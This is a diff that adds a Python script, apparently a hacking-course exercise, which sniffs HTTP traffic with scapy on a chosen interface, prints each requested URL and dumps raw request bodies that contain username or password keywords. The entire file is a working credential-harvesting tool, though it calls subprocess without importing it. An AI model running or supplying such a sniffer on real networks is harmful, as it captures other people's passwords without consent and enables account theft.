@@ -1,0 +1,51 @@
+#!/usr/bin/python3.8
+
+import re
+import argparse
+import scapy.all as scapy
+from scapy.layers import http
+
+def get_args():
+	parser = argparse.ArgumentParser(description='Simple packet sniffer!')
+	parser.add_argument('-i','--interface',dest='interface',help='Interface to sniff packets on')
+	args = parser.parse_args()
+	if not args.interface:
+		parser.error('Please enter a valid interface!')
+	check_interface(args.interface)
+	return args
+
+def check_interface(interface):
+	process = subprocess.run(['ifconfig','-a'],text=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+	matching = re.findall(r'(.*): flags', process.stdout)
+	#print(matching)
+	if interface not in matching:
+		print("Enter a valid interface...exiting!")
+		exit()
+
+def get_url(packet):
+	return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+
+def get_login_info(packet):
+	usernames = ['Username','UserLogin','username','uname','user','User']
+	passwords = ['Pass','pass','password','Password']
+	keywords = usernames+passwords
+	if packet.haslayer(scapy.Raw):
+		load = str(packet[scapy.Raw].load)
+		for keyword in keywords:
+			if keyword in load:
+				print('\n\n[+] Possible username and passwords:\n' + load + '\n\n')
+				break
+
+def process_packet(packet):
+	#packet.show()
+	if packet.haslayer(http.HTTPRequest):
+		#packet.show()
+		url = get_url(packet)
+		print(url)
+		get_login_info(packet)
+
+def sniff(interface):
+	scapy.sniff(iface=interface,store=False,prn=process_packet)
+
+args = get_args()
+sniff(args.interface)
